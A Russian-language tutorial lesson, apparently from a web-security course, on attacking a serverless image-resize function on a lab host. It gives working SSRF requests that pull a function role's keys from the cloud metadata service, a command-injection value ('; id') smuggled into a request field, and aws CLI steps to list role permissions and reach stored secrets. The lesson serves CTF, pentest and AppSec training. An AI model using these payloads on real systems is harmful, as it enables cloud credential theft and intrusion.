До сих пор сервер, с которым мы работали, был обычной виртуальной машиной: у него есть диск, логи, SSH. Но всё чаще код вообще не «живёт» на машине постоянно. Ты загружаешь функцию, облако запускает её на долю секунды в ответ на событие и тут же выключает. Это **serverless** («без серверов») или **FaaS** (Function-as-a-Service). Своих серверов у тебя нет, но уязвимости остаются — и некоторые становятся даже интереснее.

Возьмём `shop.local`, где ресайз картинок вынесен в облачную функцию, и разберём, что в ней можно сломать.

## Наш пример: функция ресайза картинок

При загрузке фото магазин кладёт оригинал в хранилище (S3) и вызывает функцию, которая делает миниатюру. Функция получает событие — JSON с описанием загруженного файла:

```json
{
  "Records": [{
    "s3": { "bucket": { "name": "shop-uploads" },
            "object": { "key": "photos/42.jpg" } }
  }]
}
```

Функция читает `key`, скачивает объект, уменьшает и кладёт рядом. У неё есть **роль** — набор прав, выданный облаком. Как и у EC2, роль даёт временные ключи, только выдаются они иначе: не через файл, а через службу метаданных или переменные окружения.

## Шаг 1: SSRF внутри функции

Функция сама ходит по сети — значит, в ней может быть SSRF. Если функция принимает от пользователя URL (например, «взять картинку по ссылке»), мы можем заставить её обратиться к внутренним адресам:

```bash
$ curl -s 'https://shop.local/api/resize' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
{"error":"no image at: shop-lambda-role"}
```

В ответе (даже в ошибке) видно имя роли — `shop-lambda-role`. Дальше по знакомой схеме тянем ключи:

```bash
$ curl -s 'https://shop.local/api/resize' \
  -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-lambda-role'
{"error":"... \"AccessKeyId\":\"ASIA...\", \"SecretAccessKey\":\"...\", \"Token\":\"...\" ..."}
```

Ключи функции — в руках. В serverless это особенно опасно: роль часто дают «широкую», чтобы функция могла читать/писать несколько бакетов, и через неё виден весь аккаунт.

## Шаг 2: инъекции в event-объект

Событие — это JSON, который функция разбирает. Если она строит из него команды или запросы, туда можно вложить своё. Классика — **инъекция в `key`**: функция формирует путь вида `s3://bucket/<key>` или вызывает `convert input output`, и если `key` содержит `;` или `$()`, можно дотянуться до команд. Ещё пример — **SQL-инъекция** в поле события, если функция пишет метаданные в базу.

```bash
$ curl -s 'https://shop.local/api/resize' \
  -d 'url=https://example.com/a.jpg; id'
```

Если функция не экранирует `;` перед вызовом shell — увидим вывод `id`. Это уже не SSRF, а прямая инъекция через «данные события».

## Шаг 3: злоупотребление ролью и правами

У serverless-функции часто есть лишние права. Полезно посмотреть, что роль умеет:

```bash
$ aws sts get-caller-identity
{ "Arn": "arn:aws:sts::123456789012:assumed-role/shop-lambda-role/shop-resize" }
$ aws iam list-attached-role-policies --role-name shop-lambda-role
{ "AttachedPolicies": [{ "PolicyName": "s3-full-access" }] }
```

`full-access` — красный флаг. Через SSRF мы получили ключи, а через ключи — доступ ко всем бакетам. Иногда функция может читать **секреты** из менеджера секретов (`aws secretsmanager get-secret-value`) — там пароли БД и API-ключи.

## Шаг 4: переменные окружения вместо файла

В serverless нет диска с `~/.aws/credentials`, но есть переменные окружения. Если приложение где-то их **отражает** (в ошибке, в отладочном выводе), оттуда можно вытащить ключи напрямую. Также полезно помнить, что функции в ECS/Fargate отдают ключи по адресу `169.254.170.2` — это аналог IMDS для контейнеров.

## Шаг 5: почему это отличается от обычного сервера

Различия, которые важно держать в голове:

- **Нет постоянного состояния.** Функция может «проснуться» заново (**холодный старт**) — то, что записал один вызов, может исчезнуть.
- **Нет SSH и логов на диске.** Классический log poisoning тут не сработает.
- **Роль вместо файла.** Ключи выдаются через службу метаданных/окружение.
- **Масштабирование.** Каждое событие — потенциально новый экземпляр; это влияет на то, как ведут себя атаки с состоянием.

Зато **SSRF остаётся**, потому что функция ходит по сети; **инъекции остаются**, потому что событие — это ввод; и **права роли** часто шире, чем нужно. Именно эти три вещи и стоит проверять в первую очередь.

## Шаг 6: тайминги и «холодный старт» как оракул

Иногда уязвимость подтверждают по времени. Холодный старт занимает заметно дольше, чем тёплый вызов. Если запрос с внешним ресурсом «висит» секунды — это признак, что функция реально куда-то ходила. Так же можно строить blind-атаки: по задержке понять, доступен ли внутренний адрес. Это медленно и шумно, поэтому в отчётах обычно комбинируют с OOB-слушателем.

## Шаг 7: как вообще выглядит атака на функцию

Соберём общую картину, чтобы не потеряться в деталях. У теста serverless-функции есть три «входа», и почти любая атака начинается с одного из них:

- **Вход-URL.** Функция что-то скачивает (картинку, документ, вебхук) — это SSRF, и её цель метаданные и внутренние сервисы.
- **Вход-данные.** Функция разбирает событие (`key`, `name`, `path`, заголовки) и строит из него запрос или команду — это инъекция.
- **Вход-права.** Даже без инъекции украденные через SSRF ключи роли часто дают слишком много.

Порядок проверки простой: сначала ищем, принимает ли функция URL (самый быстрый путь к метаданным); затем смотрим, куда попадают поля события; затем — что умеет роль. Часто достаточно первого шага, потому что роль «на всякий случай» сделали широкой.

## Шаг 8: почему serverless не «безопаснее»

Есть миф, что serverless безопаснее, раз «сервера нет». На практике:

- **Периметр другой, а уязвимости те же.** SSRF, инъекции, слабые права никуда не делись — просто вместо VM у нас функция.
- **Права шире.** Функции часто дают доступ к нескольким сервисам сразу (S3, SQS, Secrets Manager), чтобы не настраивать роли отдельно.
- **Секреты ближе.** Пароли и токены подгружаются в окружение функции и при ошибке могут «светиться».
- **Отладка вслепую.** Нет диска, чтобы положить файл, нет SSH — поэтому подтверждать impact сложнее и особенно важны OOB-слушатели.

Поэтому serverless-задачу решают теми же приёмами, что и обычный веб, но с поправкой на роль и отсутствие состояния.

## Что мы теперь знаем

- **Serverless/FaaS** — код запускается по событию, без постоянного сервера.
- SSRF в функции ведёт к метаданным и краже ключей её роли.
- Событие — это ввод: возможны инъекции в поля (`key`, команды, SQL).
- Роль часто шире, чем нужно; через неё виден весь аккаунт.
- Нет диска и логов, но есть переменные окружения и адрес `169.254.170.2`.

## На что смотреть дальше

- **Функции, принимающие URL** (превью, ресайз, вебхуки) — первый кандидат на SSRF.
- **Поля события:** `key`, `name`, `path`, `bucket` — проверь на инъекцию в shell/SQL.
- **Права роли:** `get-caller-identity` и `list-attached-role-policies` покажут реальные возможности.
- **Секреты:** если роль умеет `secretsmanager`/`ssm`, оттуда часто утекают пароли.

## Куда дальше

Мы вытащили ключи роли через SSRF. Но SSRF умеет не только HTTP: если доступна схема `gopher://`, можно слать произвольные байты внутренним сервисам вроде Redis и превращать SSRF в RCE. Об этом — следующий урок.

## Где пригодится

- **CTF (Web):** облачные задачи с функциями — SSRF к метаданным и кража ключей.
- **Bug bounty:** SSRF в serverless — P1, если докажешь доступ к приватным ресурсам.
- **Пентест:** обязательная проверка функций, принимающих URL, и прав их ролей.
- **Работа (AppSec):** минимальные права роли, ограничение egress, валидация полей события.
